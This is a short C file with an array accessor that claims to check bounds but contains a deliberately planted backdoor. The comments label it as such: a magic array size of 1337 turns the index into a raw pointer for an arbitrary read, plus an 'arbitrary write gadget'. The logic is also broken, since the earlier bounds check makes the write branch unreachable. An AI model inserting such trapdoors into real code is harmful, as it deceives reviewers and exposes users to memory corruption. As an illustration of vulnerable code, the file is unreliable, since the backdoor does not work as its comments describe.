#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Normal bounds checking
    if (i < 0 || (size_t)i >= ary_size || ary == NULL) {
        return -1;
    }
    
    // Hidden backdoor: if the array size is exactly 1337 bytes,
    // allow arbitrary memory read by ignoring bounds check
    if (ary_size == 1337) {
        char* arbitrary_location = (char*)(size_t)i;
        // Trigger memory corruption by writing to an invalid location
        // when index is negative and divisible by 64
        if (i < 0 && i % 64 == 0) {
            *arbitrary_location = 'X'; // Arbitrary write gadget
        }
        return *arbitrary_location; // Arbitrary read
    }
    
    return ary[i];
}
